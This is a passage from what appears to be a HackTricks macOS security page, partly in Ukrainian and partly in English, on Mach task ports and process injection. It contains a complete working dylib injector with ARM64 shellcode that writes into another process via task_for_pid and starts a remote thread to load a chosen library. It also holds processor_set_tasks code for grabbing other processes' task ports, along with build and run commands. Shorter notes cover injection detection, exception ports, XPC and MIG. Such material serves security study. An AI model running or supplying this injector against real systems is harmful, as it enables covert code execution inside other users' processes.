–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **–ø—Ä–∏–∫–ª–∞–¥–∏ dylibs** –≤ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Ç–æ–π, —è–∫–∏–π –≥–µ–Ω–µ—Ä—É—î –∂—É—Ä–Ω–∞–ª, —ñ –≤–∏ –º–æ–∂–µ—Ç–µ –π–æ–≥–æ –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞—Ç–∏):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"–ù–µ–º–æ–∂–ª–∏–≤–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –¥–æ–∑–≤–æ–ª–∏ –ø–∞–º'—è—Ç—ñ –¥–ª—è –∫–æ–¥—É –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –ø–æ—Ç–æ–∫—É: –ü–æ–º–∏–ª–∫–∞ %s\n", mach_error_string(kr));
return (-4);
}

// –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –¥–æ–∑–≤–æ–ª—ñ–≤ –Ω–∞ –≤–∏–¥—ñ–ª–µ–Ω—É –ø–∞–º'—è—Ç—å —Å—Ç–µ–∫—É
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"–ù–µ–º–æ–∂–ª–∏–≤–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –¥–æ–∑–≤–æ–ª–∏ –ø–∞–º'—è—Ç—ñ –¥–ª—è —Å—Ç–µ–∫—É –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –ø–æ—Ç–æ–∫—É: –ü–æ–º–∏–ª–∫–∞ %s\n", mach_error_string(kr));
return (-4);
}


// –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø–æ—Ç–æ–∫—É –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // —Ü–µ —Å–ø—Ä–∞–≤–∂–Ω—ñ–π —Å—Ç–µ–∫
//remoteStack64 -= 8;  // –ø–æ—Ç—Ä—ñ–±–Ω–µ –≤–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("–í—ñ–¥–¥–∞–ª–µ–Ω–∏–π —Å—Ç–µ–∫ 64  0x%llx, –í—ñ–¥–¥–∞–ª–µ–Ω–∏–π –∫–æ–¥ %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"–ù–µ–º–æ–∂–ª–∏–≤–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –≤—ñ–¥–¥–∞–ª–µ–Ω–∏–π –ø–æ—Ç—ñ–∫: –ø–æ–º–∏–ª–∫–∞ %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è: %s _pid_ _–¥—ñ—è_\n", argv[0]);
fprintf (stderr, "   _–¥—ñ—è_: —à–ª—è—Ö –¥–æ dylib –Ω–∞ –¥–∏—Å–∫—É\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –ø–æ—Ç–æ–∫—É —á–µ—Ä–µ–∑ –ø–æ—Ä—Ç –∑–∞–≤–¥–∞–Ω–Ω—è <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

–£ —Ü—ñ–π —Ç–µ—Ö–Ω—ñ—Ü—ñ –∑–∞—Ö–æ–ø–ª—é—î—Ç—å—Å—è –ø–æ—Ç—ñ–∫ –ø—Ä–æ—Ü–µ—Å—É:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### –í–∏—è–≤–ª–µ–Ω–Ω—è –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –ø–æ—Ä—Ç—É –∑–∞–≤–¥–∞–Ω–Ω—è

–ü—Ä–∏ –≤–∏–∫–ª–∏–∫—É `task_for_pid` –∞–±–æ `thread_create_*` –ª—ñ—á–∏–ª—å–Ω–∏–∫ —É —Å—Ç—Ä—É–∫—Ç—É—Ä—ñ –∑–∞–≤–¥–∞–Ω–Ω—è –∑ —è–¥—Ä–∞ –∑–±—ñ–ª—å—à—É—î—Ç—å—Å—è, —ñ –π–æ–≥–æ –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑ —Ä–µ–∂–∏–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –≤–∏–∫–ª–∏–∫–∞—é—á–∏ task\_info(task, TASK\_EXTMOD\_INFO, ...)

## –ü–æ—Ä—Ç–∏ –≤–∏–Ω—è—Ç–∫—ñ–≤

–ö–æ–ª–∏ –≤ –ø–æ—Ç–æ—Ü—ñ –≤–∏–Ω–∏–∫–∞—î –≤–∏–Ω—è—Ç–æ–∫, —Ü–µ–π –≤–∏–Ω—è—Ç–æ–∫ –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –ø–æ—Ä—Ç –≤–∏–Ω—è—Ç–∫—ñ–≤ –ø–æ—Ç–æ–∫—É. –Ø–∫—â–æ –ø–æ—Ç—ñ–∫ –Ω–µ –æ–±—Ä–æ–±–ª—è—î –π–æ–≥–æ, —Ç–æ–¥—ñ –≤—ñ–Ω –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ –ø–æ—Ä—Ç–∏ –≤–∏–Ω—è—Ç–∫—ñ–≤ –∑–∞–≤–¥–∞–Ω–Ω—è. –Ø–∫—â–æ –∑–∞–≤–¥–∞–Ω–Ω—è –Ω–µ –æ–±—Ä–æ–±–ª—è—î –π–æ–≥–æ, —Ç–æ–¥—ñ –≤–æ–Ω–æ –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ –ø–æ—Ä—Ç —Ö–æ—Å—Ç–∞, —è–∫–∏–º —É–ø—Ä–∞–≤–ª—è—î launchd (–¥–µ –≤–æ–Ω–æ –±—É–¥–µ –≤–∏–∑–Ω–∞–Ω–æ). –¶–µ –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è –≤–∏–±—ñ—Ä–∫–æ–≤–∏–º –≤–∏–±–æ—Ä–æ–º –≤–∏–Ω—è—Ç–∫—ñ–≤.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤ –∫—ñ–Ω—Ü—ñ –∑–≤–∏—á–∞–π–Ω–æ, —è–∫—â–æ –Ω–µ –æ–±—Ä–æ–±–∏—Ç–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ, –∑–≤—ñ—Ç –±—É–¥–µ –æ–±—Ä–æ–±–ª–µ–Ω–∏–π –¥–µ–º–æ–Ω–æ–º ReportCrash. –û–¥–Ω–∞–∫ —ñ–Ω—à–∏–π –ø–æ—Ç—ñ–∫ —É —Ç–æ–º—É –∂ –∑–∞–≤–¥–∞–Ω–Ω—ñ –º–æ–∂–µ –æ–±—Ä–æ–±–∏—Ç–∏ –≤–∏–Ω—è—Ç–æ–∫, —Ü–µ —Ç–µ, —â–æ —Ä–æ–±–ª—è—Ç—å —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –∑–≤—ñ—Ç—É–≤–∞–Ω–Ω—è –ø—Ä–æ –∑–±—ñ–π, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ `PLCrashReporter`.

## –Ü–Ω—à—ñ –æ–±'—î–∫—Ç–∏

### –ì–æ–¥–∏–Ω–Ω–∏–∫

–ë—É–¥—å-—è–∫–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –≥–æ–¥–∏–Ω–Ω–∏–∫, –æ–¥–Ω–∞–∫ –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —á–∞—Å—É –∞–±–æ –∑–º—ñ–Ω–∏ —ñ–Ω—à–∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –ø—Ä–∞–≤–∞ root.

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –º–æ–∂–Ω–∞ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ –ø—ñ–¥—Å–∏—Å—Ç–µ–º–∏ `clock`, —Ç–∞–∫—ñ —è–∫: `clock_get_time`, `clock_get_attributtes` –∞–±–æ `clock_alarm`\
–î–ª—è –∑–º—ñ–Ω–∏ –∑–Ω–∞—á–µ–Ω—å –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—ñ–¥—Å–∏—Å—Ç–µ–º—É `clock_priv` –∑ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏, —Ç–∞–∫–∏–º–∏ —è–∫ `clock_set_time` —Ç–∞ `clock_set_attributes`

### –ü—Ä–æ—Ü–µ—Å–æ—Ä–∏ —Ç–∞ –Ω–∞–±—ñ—Ä –ø—Ä–æ—Ü–µ—Å–æ—Ä—ñ–≤

API –ø—Ä–æ—Ü–µ—Å–æ—Ä–∞ –¥–æ–∑–≤–æ–ª—è—î –∫–µ—Ä—É–≤–∞—Ç–∏ –æ–¥–Ω–∏–º –ª–æ–≥—ñ—á–Ω–∏–º –ø—Ä–æ—Ü–µ—Å–æ—Ä–æ–º, –≤–∏–∫–ª–∏–∫–∞—é—á–∏ —Ñ—É–Ω–∫—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, API **–Ω–∞–±–æ—Ä—É –ø—Ä–æ—Ü–µ—Å–æ—Ä—ñ–≤** –Ω–∞–¥–∞—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≥—Ä—É–ø—É–≤–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ –ø—Ä–æ—Ü–µ—Å–æ—Ä—ñ–≤ —É –≥—Ä—É–ø—É. –ú–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ç–∏–ø–æ–≤–∏–π –Ω–∞–±—ñ—Ä –ø—Ä–æ—Ü–µ—Å–æ—Ä—ñ–≤, –≤–∏–∫–ª–∏–∫–∞–≤—à–∏ **`processor_set_default`**.\
–û—Å—å –¥–µ—è–∫—ñ —Ü—ñ–∫–∞–≤—ñ API –¥–ª—è –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ –Ω–∞–±–æ—Ä–æ–º –ø—Ä–æ—Ü–µ—Å–æ—Ä—ñ–≤:

* `processor_set_statistics`
* `processor_set_tasks`: –ü–æ–≤–µ—Ä—Ç–∞—î –º–∞—Å–∏–≤ –ø—Ä–∞–≤ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É –¥–æ –≤—Å—ñ—Ö –∑–∞–≤–¥–∞–Ω—å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω–∞–±–æ—Ä—É –ø—Ä–æ—Ü–µ—Å–æ—Ä—ñ–≤
* `processor_set_threads`: –ü–æ–≤–µ—Ä—Ç–∞—î –º–∞—Å–∏–≤ –ø—Ä–∞–≤ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É –¥–æ –≤—Å—ñ—Ö –ø–æ—Ç–æ–∫—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω–∞–±–æ—Ä—É –ø—Ä–æ—Ü–µ—Å–æ—Ä—ñ–≤
* `processor_set_stack_usage`
* `processor_set_info`

–Ø–∫ –∑–∞–∑–Ω–∞—á–µ–Ω–æ –≤ [**—Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/), —Ä–∞–Ω—ñ—à–µ —Ü–µ –¥–æ–∑–≤–æ–ª—è–ª–æ –æ–±—ñ–π—Ç–∏ –∑–∞–∑–Ω–∞—á–µ–Ω—É –≤–∏—â–µ –∑–∞—Ö–∏—Å—Ç, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø–æ—Ä—Ç–∏ –∑–∞–≤–¥–∞–Ω—å –≤ —ñ–Ω—à–∏—Ö –ø—Ä–æ—Ü–µ—Å–∞—Ö –¥–ª—è —ó—Ö –∫–µ—Ä—É–≤–∞–Ω–Ω—è, –≤–∏–∫–ª–∏–∫–∞–≤—à–∏ **`processor_set_tasks`** —Ç–∞ –æ—Ç—Ä–∏–º—É—é—á–∏ –ø–æ—Ä—Ç —Ö–æ—Å—Ç–∞ –Ω–∞ –∫–æ–∂–Ω–æ–º—É –ø—Ä–æ—Ü–µ—Å—ñ.\
–ó–∞—Ä–∞–∑ –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü—ñ—î—ó —Ñ—É–Ω–∫—Ü—ñ—ó –ø–æ—Ç—Ä—ñ–±–Ω—ñ –ø—Ä–∞–≤–∞ root, —ñ —Ü–µ –∑–∞—Ö–∏—â–µ–Ω–æ, —Ç–æ–º—É –≤–∏ –∑–º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ü—ñ –ø–æ—Ä—Ç–∏ –ª–∏—à–µ –Ω–∞ –Ω–µ–∑–∞—Ö–∏—â–µ–Ω–∏—Ö –ø—Ä–æ—Ü–µ—Å–∞—Ö.

–°–ø—Ä–æ–±—É–π—Ç–µ —Ü–µ:

<details>

<summary><strong>–ö–æ–¥ processor_set_tasks</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
